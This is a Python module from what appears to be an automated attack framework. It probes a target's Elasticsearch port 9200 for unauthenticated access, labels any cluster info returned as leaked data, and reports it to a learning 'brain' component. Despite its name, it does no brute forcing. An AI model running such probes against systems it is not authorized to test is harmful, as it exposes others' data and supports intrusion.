import asyncio
import httpx
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class ElasticsearchBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}
        self.tor = None  # не используется

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "elasticsearch_bruteforce", "success": False, "risk": 8}

        host = options['context']['target'].split('/')[2].split(':')[0]
        port = 9200
        url = f"http://{host}:{port}"

        self.logger.info(f"ELASTICSEARCH → {url}")

        try:
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.get(url)
                if resp.status_code == 200 and "cluster_name" in resp.text:
                    result.update({
                        "success": True,
                        "vulnerable_payload": "no_auth",
                        "data_leaked": {"info": resp.json()}
                    })
                    self.logger.breach("ELASTICSEARCH: NO AUTH")
                    if self.brain:
                        self.brain.learn("elasticsearch_bruteforce", target, "no_auth", True)
        except:
            pass

        return result